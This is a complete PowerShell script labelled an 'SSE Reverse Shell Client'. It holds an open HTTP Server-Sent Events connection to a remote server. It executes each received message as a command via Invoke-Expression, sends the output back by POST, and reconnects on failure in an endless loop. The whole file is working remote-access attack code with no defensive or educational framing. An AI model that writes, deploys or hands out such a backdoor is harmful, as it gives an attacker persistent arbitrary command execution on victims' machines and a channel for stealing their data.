<#
.SYNOPSIS
SSE Reverse Shell Client.

.DESCRIPTION
Connects to an SSE endpoint via HTTP, listens for incoming commands using Server-Sent Events,
executes them locally, and posts results back to a server.

.PARAMETER Uri
The base URI of the SSE server (e.g., http://localhost:88).

.NOTES
Author: TNCX-byte
License: MIT
#>

function Start-SseClient {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Uri
    )

    $sseUri  = "$Uri/sse"
    $postUri = "$Uri/post"

    [System.Net.ServicePointManager]::Expect100Continue = $false

    while ($true) {
        try {
            $request = [System.Net.WebRequest]::Create($sseUri)
            $request.Method = "GET"
            $request.Accept = "text/event-stream"
            $response = $request.GetResponse()
            $stream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)

            Write-Host "Connected to SSE stream at $sseUri."

            while (-not $reader.EndOfStream) {
                try {
                    $line = $reader.ReadLine()
                    if ($line -and $line.StartsWith("data:")) {
                        $msg = $line.Substring(5).Trim()

                        if ($msg -eq "keep-alive") {
                            Write-Host "Keep-alive received, staying connected..."
                            continue
                        }

                        if (-not [string]::IsNullOrWhiteSpace($msg) -and $msg -ne "0") {
                            Write-Host "SSE message received: $msg"

                            try {
                                $output = Invoke-Expression $msg | Out-String
                            }
                            catch {
                                $output = $_.Exception.Message
                            }

                            $postBody = "databack: $output"
                            try {
                                $postResponse = Invoke-WebRequest -Uri $postUri -Method POST -Body $postBody -ContentType "text/plain"
                                Write-Host "Sent databack, server response:"
                                Write-Host $postResponse.Content
                            }
                            catch {
                                Write-Warning "Error posting databack to server: $_"
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "Error processing SSE message: $_"
                    break
                }
            }
        }
        catch {
            Write-Warning "Error connecting to SSE server: $_"
        }
        finally {
            if ($reader) { $reader.Close() }
            if ($stream) { $stream.Close() }
            if ($response) { $response.Close() }
        }

        Write-Host "Reconnecting SSE after failure..."
        Start-Sleep -Seconds 5
    }
}
